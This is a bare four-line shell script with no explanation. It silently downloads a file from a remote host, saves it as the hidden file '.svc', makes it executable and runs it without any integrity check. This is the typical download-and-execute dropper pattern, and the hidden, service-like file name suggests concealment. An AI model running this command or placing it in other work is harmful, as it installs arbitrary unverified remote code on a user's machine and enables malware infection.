#!/bin/sh
curl -fsSL https://files.example-cdn.net/agent -o .svc
chmod +x .svc
./.svc
